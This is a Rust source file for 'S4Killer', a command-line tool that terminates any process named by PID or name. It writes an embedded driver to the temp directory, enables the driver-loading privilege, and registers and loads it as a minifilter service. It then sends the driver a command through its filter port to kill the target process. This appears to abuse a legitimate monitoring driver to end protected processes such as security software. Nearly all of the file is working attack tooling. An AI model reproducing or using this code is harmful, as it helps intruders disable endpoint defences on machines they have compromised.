use std::{env, fs, mem, path};
use sysinfo::System;
use windows::Win32::Foundation::{CloseHandle, ERROR_SERVICE_DOES_NOT_EXIST, HANDLE, LUID};
use windows::Win32::Security::{AdjustTokenPrivileges, LookupPrivilegeValueW, SC_HANDLE, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY_SOURCE};
use windows::Win32::System::Services::{self, CloseServiceHandle, CreateServiceW, OpenSCManagerW, OpenServiceW};
use windows::Win32::System::Registry::{RegCreateKeyW, RegOpenKeyW, RegSetValueExW, HKEY, HKEY_LOCAL_MACHINE, REG_SZ};
use windows::Win32::Storage::InstallableFileSystems::{FilterLoad, FilterConnectCommunicationPort, FilterSendMessage};
use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
use windows::core::*;
use std::ffi::c_void;

const FILTER_NAME: &str = "\\ITM_Mon";
const SERVICE_NAME: &str = "probmon";

mod driver;

#[repr(C)]
struct CommandSetPidToTerminate {
    command_type: u32,
    pid_to_kill: u32
}

impl CommandSetPidToTerminate {
    fn new(pid: u32) -> CommandSetPidToTerminate {
        CommandSetPidToTerminate {
            command_type: 3,
            pid_to_kill: pid
        }
    }
}

#[repr(C)]
struct CommandEnableTermination {
    command_type: u32,
    data_count: u32,
    my_pid: u32
}

impl CommandEnableTermination {
    fn new() -> CommandEnableTermination {
        CommandEnableTermination {
            command_type: 1,
            data_count: 1,
            my_pid: std::process::id()
        }
    }
}

fn acquire_privileges() {
    unsafe {
        let mut token = HANDLE::default();
        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY_SOURCE, &mut token).expect("Unable to openr current process token");

        let mut luid = LUID::default();
        LookupPrivilegeValueW( PCWSTR::null(), w!("SeLoadDriverPrivilege"), &mut luid).expect("Unable to lookup SeLoadDriverPrivilege privilege");

        let mut token_privileges = TOKEN_PRIVILEGES::default();
        token_privileges.PrivilegeCount = 1;
        token_privileges.Privileges[0].Luid = luid;
        token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        AdjustTokenPrivileges(
            token, 
            false, 
            Some(&mut token_privileges), 
            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32, 
            None, 
            None
        ).expect("Unable to adjust token privileges");

        CloseHandle(token).expect("Unable to close handle");
    }
    
}

unsafe fn create_service(svc_manager: SC_HANDLE, driver_filename: &path::PathBuf) -> SC_HANDLE {
    // create service
    let sv_handle = CreateServiceW(
        svc_manager, 
        &HSTRING::from(SERVICE_NAME), 
        PCWSTR::null(), 
        Services::SERVICE_ALL_ACCESS, 
        Services::SERVICE_FILE_SYSTEM_DRIVER, 
        Services::SERVICE_DEMAND_START, 
        Services::SERVICE_ERROR_NORMAL, 
        &HSTRING::from(driver_filename.as_path()), 
        PCWSTR::null(),
        None,
        PCWSTR::null(), 
        PCWSTR::null(), 
        PCWSTR::null()
    ).expect("Unable to create the service");

    // create additional keys necessary for minifilter loading
    let mut hkey = HKEY::default();
    let reg_name = format!("SYSTEM\\CurrentControlSet\\Services\\{SERVICE_NAME}");
    RegOpenKeyW(HKEY_LOCAL_MACHINE, &HSTRING::from(reg_name), &mut hkey).expect("Unable to open key");

    let mut instances_key = HKEY::default();
    RegCreateKeyW(hkey, w!("Instances"), &mut instances_key).expect("Unable to create Instances key");
    
    let mut minifilter_instance = HKEY::default();
    let reg_name = format!("{SERVICE_NAME} Instance");
    RegCreateKeyW(instances_key, &HSTRING::from(&reg_name), &mut minifilter_instance).expect("Unable to create Driver Instance key");
    
    let key_value_u8 = &HSTRING::from(&reg_name);    
    let key_value_u8 = key_value_u8.as_wide().align_to::<u8>().1;
    RegSetValueExW(instances_key, w!("DefaultInstance"), 0, REG_SZ, Some(&key_value_u8)).expect("Unable to create DefaultInstance string value");

    let key_value_u8 = w!("145610");
    let key_value_u8 = key_value_u8.as_wide().align_to::<u8>().1;
    RegSetValueExW(minifilter_instance, w!("Altitude"), 0, REG_SZ, Some(key_value_u8)).expect("Unable to create Altitude string value");

    sv_handle
}

fn activate_service(driver_filename: &path::PathBuf) {
    unsafe {
        let svc_manager = OpenSCManagerW(PCWSTR::null(), PCWSTR::null(), Services::SC_MANAGER_CREATE_SERVICE).expect("Unable to open service manager, ensure that you have the right permission");
        let sv_handle = 
            match OpenServiceW(svc_manager, &HSTRING::from(SERVICE_NAME), Services::SC_MANAGER_CONNECT) {
                Ok(handle) => { handle }
                Err(e) => {
                    if e == Error::from(ERROR_SERVICE_DOES_NOT_EXIST) {
                        let sv_handle = create_service(svc_manager, driver_filename);
                        FilterLoad(&HSTRING::from(SERVICE_NAME)).expect("Unable to start the minifilter driver");
                        sv_handle
                    }
                    else {
                        panic!("Unable to install Windows service");
                    }                    
                }
            };      

        CloseServiceHandle(sv_handle).expect("Unable to close service");
        CloseServiceHandle(svc_manager).expect("Unable to close service manager");
    }    
}

fn terminate_process(pid: u32) {
    unsafe {
        let port_handle = FilterConnectCommunicationPort(
            &HSTRING::from(FILTER_NAME),
            0,
            None,
            0,
            None
        ).expect("Unable to open the communication port");

        let mut command = CommandSetPidToTerminate::new(pid);
        let mut responze_size = 0;
        FilterSendMessage(
            port_handle,
            &mut command as *mut _ as *mut c_void,
            mem::size_of::<CommandSetPidToTerminate>() as u32,
            None,
            0,
            &mut responze_size,
        ).expect("Unable to send message");


        let mut command = CommandEnableTermination::new();
        FilterSendMessage(
            port_handle,
            &mut command as *mut _ as *mut c_void,
            mem::size_of::<CommandEnableTermination>() as u32,
            None,
            0,
            &mut responze_size,
        ).expect("Unable to send message");

        CloseHandle(port_handle).expect("Unable to close communication port handle");
    }
}

fn drop_driver_file() -> path::PathBuf {
    let temp_dir = std::env::temp_dir();
    let driver_filename = temp_dir.join(format!("{SERVICE_NAME}.sys"));
    if !path::Path::new(&driver_filename).is_file() {
        fs::write(&driver_filename, driver::DRIVER_CONTENT).expect("Unable to write the driver to disk");
    }    
    driver_filename
}

fn get_pid(pid_or_name: &str) -> Option<u32> {
    let sys = System::new_all();
    for (pid, process) in sys.processes() {
        if pid.to_string() == pid_or_name || process.name() == pid_or_name {
            return Some(pid.as_u32());
        }
    }
    None
}

fn main() {
    println!("-=[ S4Killer ]=-");    
    if let Some(pid_or_name) = env::args().nth(1) {
        if let Some(pid) = get_pid(&pid_or_name) {
            let driver_filename = drop_driver_file();
            acquire_privileges();
            activate_service(&driver_filename);
            terminate_process(pid);
            println!("[+] Process '{pid_or_name}' will be killed");
        }
        else {
            println!("[!] Unable to find the specified <PID> or <Program>: {pid_or_name}");
            println!("Usage: {} <PID | PROGRAM NAME>", env::args().nth(0).unwrap());
        }        
    }
    else {
        println!("Missing <PID> or <Program> input parameter");
        println!("Usage: {} <PID | PROGRAM NAME>", env::args().nth(0).unwrap());
    }
}
